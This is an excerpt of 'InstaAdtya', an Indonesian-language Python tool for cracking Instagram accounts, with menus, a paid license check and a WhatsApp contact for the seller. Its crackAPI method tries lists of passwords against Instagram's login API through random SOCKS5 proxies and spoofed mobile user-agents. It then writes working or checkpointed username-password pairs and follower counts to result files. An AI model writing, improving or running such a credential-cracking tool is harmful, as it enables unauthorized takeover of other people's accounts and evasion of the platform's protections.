...
for x in range(1000):
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android 4.1.2; ME371MG Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android 10; Aqua_LifeIII Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    tiga  = f"Mozilla/5.0 (Linux; Android 6.0; Intex Aqua Supreme; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 wkbrowser 5.0.17 {str(rr(2111111,2999999))} js 5.1.1 newfocus lng=ru"
...
def banner():
	_clearLayar_()
	prints(Panel(f"""
{M2} ⣠⣴⣶⣶⣶⣶⣶⣶⣶⣶⣦⣄   {R2}___           _           _       _ _ {P2}              
{M2} ⣿⣿⣿⡿⠛⢉⡉⠛⢿⣤⣼⣿  {R2}|_ _|_ __  ___| |_ __ _   / \   __| | |_ _   _  __ _ {P2}
{M2} ⣿⣿⡏⢠⣾⣿⣿⣷⡄⢹⣿⣿   {R2}| || '_ \/ __| __/ _` | / _ \ / _` | __| | | |/ _` |{P2}
{P2} ⣿⣿⣇⠘⢿⣿⣿⡿⠃⣸⣿⣿   {R2}| || | | \__ \ || (_| |/ ___ \ (_| | |_| |_| | (_| |{P2}
 {P2}⣿⣿⣿⣷⣤⣈⣁⣤⣾⣿⣿⣿  {R2}|___|_| |_|___/\__\__,_/_/   \_\__,_|\__|\__, |\__,_|{P2}
 {P2}⠙⠻⠿⠿⠿⠿⠿⠿⠿⠿⠟⠋                                           {R2}|___/{P2}
\t\t     {K2} InstaAdtya {P2}|{H2} CodeBy Aditya """,title=f"{R2}{waktu()}",width=80,padding=(0,4),style=f"{color_table}"))
...
def _loginPILL_():
    if "sukses" in lisensiku:
        try:
            ...
            banner()
            prints(Panel(f"{P2}[{H2}01{P2}]. login dengan cookie ( {H2}disarankan {P2})\n{P2}[{H2}02{P2}]. login dengan username password\n{P2}[{H2}03{P2}]. free cookie ( {M2}tidak semua bisa {P2})\n{P2}[{H2}04{P2}]. lihat akun hasil crack\n{P2}[{H2}05{P2}]. hapus lisensi ( {H2}premium{P2} )\n{P2}[{H2}00{P2}]. keluar tools",width=80,padding=(0,17),style=f"{color_table}"))
            ask = input(f" {H}# {P}choose : ")
            if ask in [""]:empty()
            elif ask in ["1","01"]:_LoginCookie_()
            elif ask in ["2","02"]:login_username()
            elif ask in ["3","03"]:freeCookie()
            elif ask in ["4","04"]:cekResult()
            elif ask in ["5","05"]:RemoveLisen()
...
def freeCookie():
    try:
        text = "# menu ini sedang di nonaktifkan"
...
def RemoveLisen():
    try:
        text = "# apakah anda yakin ingin menghapus lisensi?"
        wrong = mark(text, style='yellow')
        sol().print(wrong)
        sen = input(f" {H}# {P}ingin menghapus lisensi? Y atau t : ")
        if sen in [""]:empty()
        elif sen in ["y","Y"]:remove()
        elif sen in ["t","T"]:_loginPILL_()
        else:wrong()
    except:pass

#+++++# hapus lisensi #+++++#
def remove():
    text = "# berhasil menghapus lisensi anda"
    wrong = mark(text, style='green')
    sol().print(wrong)
    try:os.remove("data/lisensi.txt")
    except:pass
...
def _LoginCookie_():
    if "sukses" in lisensiku:
        try:
          ...
          prints(Panel(f"{P2}jangan gunakan akun pribadi anda untuk login ke InstaAdtya",width=80,padding=(0,9),style=f"{color_table}"))
...
class instagram:
	...
	def crackAPI(self,user,pas):
		...
		try: # method API by Aditya Putra Mahesa XD
			for pw in pas:
				PwXyaa = random.randint(1000000000, 99999999999)
				ts = calendar.timegm(current_GMT)
				proxy = {"http": "socks5://{random.choice(_XcPROXY_)}"}
				rr=random.randint
				slebew=random.choice([f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; 22041219I Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/537.36 YaApp_Android/10.91 YaSearchBrowser/10.91","Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; en-US; GT-S5360 Build/GINGERBREAD) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/{str(rr(40,104))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/534.30"])
				...
				PwXyaa = json.loads(respon.text)
				if 'userId' in str(PwXyaa):
					...
					print('\n')
					cetak(nel(pepekXD,style='',title='\r[green]Live[white]'))
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break
				elif 'checkpoint_url' in str(PwXyaa):
					nama,pengikut,mengikut,postingan = self.APIinfo(user)
					print("\r                                   ")
					adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-agent: {user_agentAPI()}'
					pepekXD = nel(adit, style='yellow')
					print('\n')
					cetak(nel(pepekXD,style='', title='\r[yellow]Cepe[white]'))
...
def key():
	...
	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token===&ProductId=17483&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);prints(Panel(f"{P2}selamat lisensi yang anda masukan terdaftar ke server InstaAdtya",width=80,padding=(0,6),style=f"{color_table}"));time.sleep(4);_loginPILL_()
	except KeyError:
...
def AdminAdtya():
    try:
        ...
        os.system("xdg-open https://wa.me/+16143244921");exit()
    except:pass
